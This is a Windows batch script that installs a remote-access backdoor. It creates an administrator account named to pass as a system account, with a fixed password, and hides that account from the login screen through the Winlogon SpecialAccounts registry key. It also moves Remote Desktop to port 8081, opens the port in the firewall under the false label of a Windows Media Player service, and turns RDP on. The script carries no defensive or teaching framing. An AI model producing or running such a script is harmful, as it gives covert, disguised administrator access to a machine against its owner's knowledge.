::function of this script
::Open Terminal Service
::Create hidden user
::Modify port 3389
::Add firewall exception


@echo off
set myuser=IUSR_MICROSOFT
set mypwd=AAAAAAAA
set myport=8081



reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 1 /f

::add hidden user
net user %myuser% /delete
net user %myuser% %mypwd% /add
net user %myuser% %mypwd%
net localgroup administrators %myuser% /add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %myuser% /t reg_dword /d 00000000 /f

::add firewall exception
netsh firewall add portopening TCP %myport% "Windows Media Player Network Sharing Service"

::change listen port
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v portnumber /t reg_dword /d %myport% /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\wds\rdpwd\tds\tcp" /v portnumber /t reg_dword /d %myport% /f

::turn on remote disktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t reg_dword /d 0 /f
